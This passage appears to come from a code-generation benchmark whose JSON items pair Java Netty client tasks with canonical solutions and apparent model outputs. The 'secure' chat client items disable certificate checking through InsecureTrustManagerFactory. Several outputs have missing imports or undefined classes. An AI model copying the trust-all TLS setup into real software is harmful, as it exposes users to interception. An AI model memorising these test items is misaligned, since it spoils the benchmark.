    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PreDestroy;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.ScheduledExecutorService;\nimport java.util.concurrent.TimeUnit;\n\n@Component\npublic class NettyClient {\n    private static final int RECONNECT_SECONDS = 5;\n    private static final Logger logger = LoggerFactory.getLogger(NettyClient.class);\n    @Value(\"${server.host}\")\n    private String serverHost;\n    @Value(\"${server.port}\")\n    private Integer serverPort;\n    private EventLoopGroup eventGroup = new NioEventLoopGroup();\n    private volatile Channel channel;\n\n    public void start() {\n        Bootstrap b = new Bootstrap();\n        b.group(eventGroup)\n         .channel(NioSocketChannel.class)\n         .handler(new ChannelInitializer<SocketChannel>() {\n             @Override\n             protected void initChannel(SocketChannel ch) throws Exception {\n                 // Add your channel handlers here\n             }\n         });\n\n        b.connect(serverHost, serverPort).addListener((ChannelFutureListener) future -> {\n            if (future.isSuccess()) {\n                logger.info(\"Connected to server\");\n                channel = future.channel();\n            } else {\n                logger.error(\"Failed to connect to server\", future.cause());\n                reconnect();\n            }\n        });\n    }\n\n    private void reconnect() {\n        ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);\n        scheduler.schedule(this::start, RECONNECT_SECONDS, TimeUnit.SECONDS);\n    }\n\n    @PreDestroy\n    public void shutdown() {\n        if (channel != null && channel.isActive()) {\n            channel.close();\n        }\n        eventGroup.shutdownGracefully();\n    }\n\n    public void send(Invocation invocation) {\n        if (channel != null && channel.isActive()) {\n            channel.writeAndFlush(invocation);\n        } else {\n            logger.warn(\"Channel is not active, cannot send message\");\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 136,
    "Instruction": "Task Description: Create a secure TCP chat client using Java Netty framework that establishes an SSL encrypted connection to a remote server, sends user input messages, and gracefully handles connection termination.\n\nClass Description: SecureChatClient is a Netty-based TCP client that connects to a secure chat server, sends messages from standard input, and properly manages connection lifecycle and resources.\n\nAttributes:\nHOST: String - The server host address (default: \"127.0.0.1\")\nPORT: int - The server port number (default: 8992)\n\nMethods:\nmain: main(String[] args) -> void - Entry point that initializes SSL context, configures Netty client, establishes connection, handles user input, and manages shutdown\n    - args: String[] - Command line arguments (unused in current implementation)\n    - Returns: void",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic final class SecureChatClient {\n\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8992\"));\n\n    public static void main(String[] args) throws Exception {\n        final SslContext sslCtx = SslContextBuilder.forClient()\n            .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new SecureChatClientInitializer(sslCtx));\n\n            Channel ch = b.connect(HOST, PORT).sync().channel();\n\n            ChannelFuture lastWriteFuture = null;\n            BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n            for (;;) {\n                String line = in.readLine();\n                if (line == null) {\n                    break;\n                }\n\n                lastWriteFuture = ch.writeAndFlush(line + \"\\r\\n\");\n\n                if (\"bye\".equals(line.toLowerCase())) {\n                    ch.closeFuture().sync();\n                    break;\n                }\n            }\n\n            if (lastWriteFuture != null) {\n                lastWriteFuture.sync();\n            }\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class SecureChatClient {\n    private static final String HOST = \"127.0.0.1\";\n    private static final int PORT = 8992;\n\n    public static void main(String[] args) throws Exception {\n        SslContext sslCtx = SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .option(ChannelOption.SO_KEEPALIVE, true)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(sslCtx.newHandler(ch.alloc()));\n                     p.addLast(new ChatClientHandler());\n                 }\n             });\n\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n            while (!f.channel().isActive()) {\n                Thread.sleep(100);\n            }\n\n            System.out.println(\"Enter message (type 'exit' to quit):\");\n            String userInput;\n            while ((userInput = reader.readLine()) != null && !userInput.equalsIgnoreCase(\"exit\")) {\n                f.channel().writeAndFlush(userInput + \"\\r\\n\").sync();\n            }\n\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 138,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework for network communication, capable of establishing connections, sending/receiving messages, and gracefully shutting down.\n\nClass Description: NettyRemotingClient is a Netty-based TCP client implementation that handles network communication with a remote server. It manages connection lifecycle, message encoding/decoding, and provides synchronous invocation capabilities.\n\nAttributes:\n- bootstrap: [Bootstrap] - Netty's Bootstrap instance for client configuration\n- eventLoopGroupWorker: [EventLoopGroup] - Manages client-side I/O threads\n\nMethods:\n- NettyRemotingClient(): [Constructor] -> [void] - Initializes the client with NioEventLoopGroup and configures Bootstrap with NioSocketChannel, TCP_NODELAY option, and pipeline handlers (encoder, decoder, and client handler)\n- createChannel(String addr): [String addr (host:port format)] -> [ChannelFuture] - Creates a channel connection to the specified address, throws RemotingConnectException if connection fails\n- invokeSync(Channel channel, RemotingCommand request, long timeoutMillis): [Channel channel, RemotingCommand request, long timeoutMillis] -> [CompletableFuture<RemotingCommand>] - Sends a request synchronously through the channel and returns a CompletableFuture for the response\n- shutdown(): [void] -> [void] - Gracefully shuts down the event loop group and releases resources\n- NettyClientHandler: [Inner Class] -> [void] - Handles incoming messages from the server (extends SimpleChannelInboundHandler<RemotingCommand>)",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport org.apache.rocketmq.remoting.exception.RemotingConnectException;\nimport org.apache.rocketmq.remoting.protocol.RemotingCommand;\n\nimport java.util.concurrent.CompletableFuture;\n\npublic class NettyRemotingClient {\n\n    private final Bootstrap bootstrap = new Bootstrap();\n    private final EventLoopGroup eventLoopGroupWorker;\n\n    public NettyRemotingClient() {\n        this.eventLoopGroupWorker = new NioEventLoopGroup();\n        this.bootstrap.group(this.eventLoopGroupWorker)\n            .channel(NioSocketChannel.class)\n            .option(ChannelOption.TCP_NODELAY, true)\n            .option(ChannelOption.SO_KEEPALIVE, false)\n            .handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline pipeline = ch.pipeline();\n                    pipeline.addLast(\n                        new NettyEncoder(),\n                        new NettyDecoder(),\n                        new NettyClientHandler());\n                }\n            });\n    }\n\n    public ChannelFuture createChannel(String addr) throws InterruptedException, RemotingConnectException {\n        String[] hostAndPort = addr.split(\":\");\n        ChannelFuture channelFuture = bootstrap.connect(hostAndPort[0], Integer.parseInt(hostAndPort[1])).sync();\n        if (!channelFuture.isSuccess()) {\n            throw new RemotingConnectException(addr);\n        }\n        return channelFuture;\n    }\n\n    public CompletableFuture<RemotingCommand> invokeSync(Channel channel, RemotingCommand request, long timeoutMillis) {\n        CompletableFuture<RemotingCommand> future = new CompletableFuture<>();\n        try {\n            channel.writeAndFlush(request).addListener(f -> {\n                if (f.isSuccess()) {\n                    // Handle response logic here\n                } else {\n                    future.completeExceptionally(f.cause());\n                }\n            });\n        } catch (Exception e) {\n            future.completeExceptionally(e);\n        }\n        return future;\n    }\n\n    public void shutdown() {\n        this.eventLoopGroupWorker.shutdownGracefully();\n    }\n\n    class NettyClientHandler extends SimpleChannelInboundHandler<RemotingCommand> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, RemotingCommand msg) throws Exception {\n            // Process incoming messages\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.timeout.IdleStateHandler;\n\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyRemotingClient {\n    private final Bootstrap bootstrap;\n    private EventLoopGroup eventLoopGroupWorker;\n\n    public NettyRemotingClient() {\n        this.eventLoopGroupWorker = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap()\n                .group(eventLoopGroupWorker)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.TCP_NODELAY, true)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(\"idleStateHandler\", new IdleStateHandler(0, 0, 60));\n                        pipeline.addLast(\"decoder\", new MessageDecoder());\n                        pipeline.addLast(\"encoder\", new MessageEncoder());\n                        pipeline.addLast(\"clientHandler\", new NettyClientHandler());\n                    }\n                });\n    }\n\n    public ChannelFuture createChannel(String addr) throws RemotingConnectException {\n        try {\n            return bootstrap.connect(addr.split(\":\")[0], Integer.parseInt(addr.split(\":\")[1])).sync();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            throw new RemotingConnectException(\"Failed to connect to \" + addr);\n        }\n    }\n\n    public CompletableFuture<RemotingCommand> invokeSync(Channel channel, RemotingCommand request, long timeoutMillis) {\n        CompletableFuture<RemotingCommand> future = new CompletableFuture<>();\n        channel.writeAndFlush(request).addListener((ChannelFutureListener) f -> {\n            if (f.isSuccess()) {\n                channel.read();\n            } else {\n                future.completeExceptionally(f.cause());\n            }\n        });\n\n        channel.eventLoop().schedule(() -> {\n            if (!future.isDone()) {\n                future.completeExceptionally(new TimeoutException(\"Request timed out\"));\n            }\n        }, timeoutMillis, TimeUnit.MILLISECONDS);\n\n        return future;\n    }\n\n    public void shutdown() {\n        eventLoopGroupWorker.shutdownGracefully();\n    }\n\n    private static class NettyClientHandler extends SimpleChannelInboundHandler<RemotingCommand> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, RemotingCommand msg) throws Exception {\n            // Handle incoming messages here\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 139,
    "Instruction": "Task Description: Create a Java class that implements a WebSocket client proxy using Netty framework to establish and manage WebSocket connections to a remote server.\n\nClass Description: The WebsocketProxy class implements the Proxy interface and provides functionality to connect to a WebSocket server using Netty's non-blocking I/O. It handles WebSocket protocol negotiation, connection management, and graceful shutdown of resources.\n\nAttributes: (This class doesn't have any explicit attributes as it's primarily focused on connection management)\n\nMethods:\n1: connect(String serverAddress, int port) -> void - Establishes a WebSocket connection to the specified server address and port. The method:\n   - Creates a WebSocket URI using the provided address and port\n   - Initializes Netty's event loop group and bootstrap\n   - Configures the channel pipeline with necessary handlers (idle state, HTTP codec, WebSocket protocol)\n   - Connects to the server and waits for the connection to close\n   - Ensures proper resource cleanup on shutdown\n   Throws InterruptedException if the connection is interrupted and URISyntaxException if the URI is malformed\n\nInput:\n- serverAddress: String - The IP address or hostname of the WebSocket server\n- port: int - The port number on which the WebSocket server is listening\n\nOutput: None (void) - The method establishes a persistent connection that remains open until closed by either end",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.codec.http.websocketx.*;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.nico.ratel.landlords.client.handler.WebsocketTransferHandler;\nimport org.nico.ratel.landlords.print.SimplePrinter;\n\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.concurrent.TimeUnit;\n\npublic class WebsocketProxy implements Proxy {\n\n    @Override\n    public void connect(String serverAddress, int port) throws InterruptedException, URISyntaxException {\n        URI uri = new URI(\"ws://\" + serverAddress + \":\" + port + \"/ratel\");\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap()\n                    .group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline()\n                                    .addLast(new IdleStateHandler(60 * 30, 0, 0, TimeUnit.SECONDS))\n                                    .addLast(new HttpClientCodec())\n                                    .addLast(new HttpObjectAggregator(8192))\n                                    .addLast(new WebSocketClientProtocolHandler(uri\n                                            , WebSocketVersion.V13\n                                            , null\n                                            , true\n                                            , new DefaultHttpHeaders(), 100000))\n                                    .addLast(\"ws\", new WebsocketTransferHandler());\n                        }\n                    });\n            SimplePrinter.printNotice(\"Connecting to \" + serverAddress + \":\" + port);\n            Channel channel = bootstrap.connect(serverAddress, port).sync().channel();\n            channel.closeFuture().sync();\n        } finally {\n            group.shutdownGracefully().sync();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultHttpHeaders;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.websocketx.TextWebSocketFrame;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientProtocolHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\n\nimport java.net.URI;\nimport java.net.URISyntaxException;\n\npublic class WebSocketProxy implements Proxy {\n\n    @Override\n    public void connect(String serverAddress, int port) throws InterruptedException, URISyntaxException {\n        URI uri = new URI(\"ws://\" + serverAddress + \":\" + port);\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new IdleStateHandler(0, 0, 60));\n                     p.addLast(new HttpClientCodec());\n                     p.addLast(new WebSocketClientProtocolHandler(uri));\n                     p.addLast(new WebSocketFrameHandler());\n                 }\n             });\n\n            ChannelFuture f = b.connect(uri.getHost(), uri.getPort()).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    private static class WebSocketFrameHandler extends SimpleChannelInboundHandler<TextWebSocketFrame> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, TextWebSocketFrame msg) throws Exception {\n            System.out.println(\"Received message: \" + msg.text());\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 140,
    "Instruction": "Task Description: Create a Java class that implements a Netty-based HTTP client for RPC communication, capable of establishing and managing TCP connections, sending requests, and handling responses.\n\nClass Description: NettyHttpConnectClient is a connection client implementation that uses Netty framework to establish HTTP connections with a remote server. It handles connection lifecycle, request sending, and connection validation.\n\nAttributes:\n- group: [EventLoopGroup] - Manages client-side I/O threads\n- channel: [Channel] - Represents the active network channel\n- serializer: [Serializer] - Handles request/response serialization\n- address: [String] - The server address including protocol and port\n- host: [String] - The server hostname extracted from address\n\nMethods:\n- init: [init(String address, Serializer serializer, XxlRpcInvokerFactory xxlRpcInvokerFactory)] -> [void] - Initializes the client with server address, serializer and invoker factory. Creates Netty bootstrap and establishes connection.\n- isValidate: [isValidate()] -> [boolean] - Checks if the current connection is active and valid.\n- close: [close()] -> [void] - Closes the active connection and releases resources.\n- send: [send(XxlRpcRequest xxlRpcRequest)] -> [void] - Serializes and sends an RPC request to the server through the established channel.",
    "Canonical_solution": "import com.wugui.datax.rpc.remoting.invoker.XxlRpcInvokerFactory;\nimport com.wugui.datax.rpc.remoting.net.common.ConnectClient;\nimport com.wugui.datax.rpc.remoting.net.common.NettyConstant;\nimport com.wugui.datax.rpc.remoting.net.params.Beat;\nimport com.wugui.datax.rpc.remoting.net.params.XxlRpcRequest;\nimport com.wugui.datax.rpc.serialize.Serializer;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.timeout.IdleStateHandler;\n\nimport java.net.URI;\nimport java.net.URL;\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyHttpConnectClient extends ConnectClient {\n\n    private EventLoopGroup group;\n    private Channel channel;\n    private Serializer serializer;\n    private String address;\n    private String host;\n\n    @Override\n    public void init(String address, final Serializer serializer, final XxlRpcInvokerFactory xxlRpcInvokerFactory) throws Exception {\n        final NettyHttpConnectClient thisClient = this;\n\n        if (!address.toLowerCase().startsWith(\"http\")) {\n            address = \"http://\" + address;\n        }\n\n        this.address = address;\n        URL url = new URL(address);\n        this.host = url.getHost();\n        int port = url.getPort() > -1 ? url.getPort() : 80;\n\n        this.group = new NioEventLoopGroup();\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel channel) throws Exception {\n                        channel.pipeline()\n                                .addLast(new IdleStateHandler(0, 0, Beat.BEAT_INTERVAL, TimeUnit.SECONDS))\n                                .addLast(new HttpClientCodec())\n                                .addLast(new HttpObjectAggregator(NettyConstant.MAX_LENGTH))\n                                .addLast(new NettyHttpClientHandler(xxlRpcInvokerFactory, serializer, thisClient));\n                    }\n                })\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 10000);\n        this.channel = bootstrap.connect(host, port).sync().channel();\n\n        this.serializer = serializer;\n\n        if (!isValidate()) {\n            close();\n            return;\n        }\n    }\n\n    @Override\n    public boolean isValidate() {\n        if (this.channel != null) {\n            return this.channel.isActive();\n        }\n        return false;\n    }\n\n    @Override\n    public void close() {\n        if (this.channel != null && this.channel.isActive()) {\n            this.channel.close();\n        }\n        if (this.group != null && !this.group.isShutdown()) {\n            this.group.shutdownGracefully();\n        }\n    }\n\n    @Override\n    public void send(XxlRpcRequest xxlRpcRequest) throws Exception {\n        byte[] requestBytes = serializer.serialize(xxlRpcRequest);\n\n        DefaultFullHttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.POST, new URI(address).getRawPath(), Unpooled.wrappedBuffer(requestBytes));\n        request.headers().set(HttpHeaderNames.HOST, host);\n        request.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.KEEP_ALIVE);\n        request.headers().set(HttpHeaderNames.CONTENT_LENGTH, request.content().readableBytes());\n\n        this.channel.writeAndFlush(request).sync();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\npublic class NettyHttpConnectClient {\n    private EventLoopGroup group;\n    private Channel channel;\n    private Serializer serializer;\n    private String address;\n    private String host;\n\n    public void init(String address, Serializer serializer, XxlRpcInvokerFactory xxlRpcInvokerFactory) {\n        this.address = address;\n        this.serializer = serializer;\n        this.host = address.split(\":\")[0];\n        this.group = new NioEventLoopGroup();\n        Bootstrap b = new Bootstrap();\n        b.group(group)\n         .channel(NioSocketChannel.class)\n         .handler(new ChannelInitializer<SocketChannel>() {\n             @Override\n             protected void initChannel(SocketChannel ch) throws Exception {\n                 ChannelPipeline p = ch.pipeline();\n                 // Add necessary handlers here\n             }\n         });\n        try {\n            channel = b.connect(host, Integer.parseInt(address.split(\":\")[1])).sync().channel();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    public boolean isValidate() {\n        return channel != null && channel.isActive();\n    }\n\n    public void close() {\n        if (channel != null) {\n            channel.close();\n        }\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n\n    public void send(XxlRpcRequest xxlRpcRequest) {\n        byte[] data = serializer.serialize(xxlRpcRequest);\n        channel.writeAndFlush(data);\n    }\n}\n```"
  },
  {
    "Task_id": 141,
    "Instruction": "Task Description: Create a Java class that manages TCP client connections using Netty framework, handling connection establishment, maintenance, and graceful shutdown.\n\nClass Description: HttpEventChannelManager is a Netty-based TCP client manager that creates and maintains connections to remote servers, provides connection metrics, and handles resource cleanup.\n\nAttributes:\n- LOG: [Logger] - Logger instance for logging debug and error messages\n- connectionSuccess: [Counter] - Metric counter for successful connections\n- connectionFailure: [Counter] - Metric counter for failed connections\n- liveConnections: [AtomicDouble] - Gauge metric for current active connections\n- nettyChannelBufferSize: [AtomicDouble] - Gauge metric for current channel buffer size\n- lowWriteBufferWatermark: [int] - Low watermark for write buffer\n- highWriteBufferWatermark: [int] - High watermark for write buffer\n- eventLoopGroup: [EventLoopGroup] - Netty event loop group for I/O operations\n- encoderEventLoopGroup: [EventLoopGroup] - Optional event loop group for compression\n- bootstrap: [Bootstrap] - Netty bootstrap for client configuration\n- channels: [ConcurrentMap<String, Channel>] - Map of active channels keyed by host:port\n\nMethods:\n- HttpEventChannelManager([Registry, MrePublishConfiguration]) -> [void] - Constructor that initializes metrics, event loops, and bootstrap configuration\n- findOrCreate([InetSocketAddress]) -> [Channel] - Finds existing or creates new channel for given address\n- find([InetSocketAddress]) -> [Channel] - Finds existing channel for given address\n- close([InetSocketAddress]) -> [void] - Closes channel for given address\n- getHostPortString([InetSocketAddress]) -> [String] - Helper method to format address as host:port string",
    "Canonical_solution": "import com.netflix.spectator.api.Counter;\nimport com.netflix.spectator.api.Registry;\nimport com.netflix.spectator.impl.AtomicDouble;\nimport io.mantisrx.publish.config.MrePublishConfiguration;\nimport io.mantisrx.publish.internal.metrics.SpectatorUtils;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.DefaultEventLoopGroup;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.WriteBufferWaterMark;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ConcurrentMap;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class HttpEventChannelManager {\n\n    private static final Logger LOG = LoggerFactory.getLogger(HttpEventChannel.class);\n\n    private final Counter connectionSuccess;\n    private final Counter connectionFailure;\n    private final AtomicDouble liveConnections;\n    private final AtomicDouble nettyChannelBufferSize;\n\n    private final int lowWriteBufferWatermark;\n    private final int highWriteBufferWatermark;\n\n    private final EventLoopGroup eventLoopGroup;\n    private final EventLoopGroup encoderEventLoopGroup;\n    private final Bootstrap bootstrap;\n    private final ConcurrentMap<String, Channel> channels;\n\n    public HttpEventChannelManager(\n            Registry registry,\n            MrePublishConfiguration config) {\n\n        this.connectionSuccess =\n                SpectatorUtils.buildAndRegisterCounter(\n                        registry, \"connectionSuccess\", \"channel\", HttpEventChannel.CHANNEL_TYPE);\n        this.connectionFailure =\n                SpectatorUtils.buildAndRegisterCounter(\n                        registry, \"connectionFailure\", \"channel\", HttpEventChannel.CHANNEL_TYPE);\n        this.liveConnections =\n                SpectatorUtils.buildAndRegisterGauge(\n                        registry, \"liveConnections\", \"channel\", HttpEventChannel.CHANNEL_TYPE);\n        this.nettyChannelBufferSize =\n                SpectatorUtils.buildAndRegisterGauge(\n                        registry, \"bufferSize\", \"channel\", HttpEventChannel.CHANNEL_TYPE);\n\n        this.lowWriteBufferWatermark = config.getLowWriteBufferWatermark();\n        this.highWriteBufferWatermark = config.getHighWriteBufferWatermark();\n\n        this.eventLoopGroup = new NioEventLoopGroup(config.getIoThreads());\n\n        boolean gzipEnabled = config.getGzipEnabled();\n        if (gzipEnabled) {\n            this.encoderEventLoopGroup = new DefaultEventLoopGroup(config.getCompressionThreads());\n        } else {\n            this.encoderEventLoopGroup = null;\n        }\n\n        this.bootstrap = new Bootstrap()\n                .group(this.eventLoopGroup)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.MESSAGE_SIZE_ESTIMATOR, MantisMessageSizeEstimator.DEFAULT)\n                .option(ChannelOption.WRITE_BUFFER_WATER_MARK,\n                        new WriteBufferWaterMark(\n                                lowWriteBufferWatermark, highWriteBufferWatermark))\n                .handler(new HttpEventChannelInitializer(\n                        registry, config, encoderEventLoopGroup));\n        this.channels = new ConcurrentHashMap<>();\n\n        Runtime.getRuntime().addShutdownHook(new Thread(this.eventLoopGroup::shutdownGracefully));\n    }\n\n    Channel findOrCreate(InetSocketAddress address) {\n        Channel channel = find(address);\n\n        if (channel == null) {\n            LOG.debug(\"creating new channel for {}\", address);\n            ChannelFuture channelFuture = bootstrap.connect(address);\n            channel = channelFuture.channel();\n\n            channels.put(getHostPortString(address), channel);\n\n            channel.closeFuture().addListener(future -> {\n                LOG.debug(\"closing channel for {}\", address);\n                channels.remove(getHostPortString(address));\n                liveConnections.set((double) channels.size());\n            });\n\n            channelFuture.addListener(future -> {\n                if (future.isSuccess()) {\n                    LOG.debug(\"connection success for {}\", address);\n                    connectionSuccess.increment();\n                    liveConnections.set((double) channels.size());\n                } else {\n                    LOG.debug(\"failed to connect to {}\", address);\n                    connectionFailure.increment();\n                }\n            });\n        }\n\n        nettyChannelBufferSize.set(highWriteBufferWatermark - channel.bytesBeforeUnwritable());\n\n        return channel;\n    }\n\n    private Channel find(InetSocketAddress address) {\n        return channels.get(getHostPortString(address));\n    }\n\n    void close(InetSocketAddress address) {\n        Channel channel = find(address);\n        if (channel != null) {\n            channel.close();\n        }\n    }\n\n    private String getHostPortString(InetSocketAddress address) {\n        return address.getHostString() + ':' + address.getPort();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.micrometer.core.instrument.Counter;\nimport io.micrometer.core.instrument.MeterRegistry;\nimport io.micrometer.core.instrument.Gauge;\n\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.atomic.AtomicDouble;\n\npublic class HttpEventChannelManager {\n    private static final Logger LOG = LoggerFactory.getLogger(HttpEventChannelManager.class);\n    private final Counter connectionSuccess;\n    private final Counter connectionFailure;\n    private final AtomicDouble liveConnections;\n    private final AtomicDouble nettyChannelBufferSize;\n    private final int lowWriteBufferWatermark;\n    private final int highWriteBufferWatermark;\n    private EventLoopGroup eventLoopGroup;\n    private EventLoopGroup encoderEventLoopGroup;\n    private Bootstrap bootstrap;\n    private final ConcurrentMap<String, Channel> channels = new ConcurrentHashMap<>();\n\n    public HttpEventChannelManager(MeterRegistry registry, MrePublishConfiguration config) {\n        this.connectionSuccess = registry.counter(\"http.eventchannel.success\");\n        this.connectionFailure = 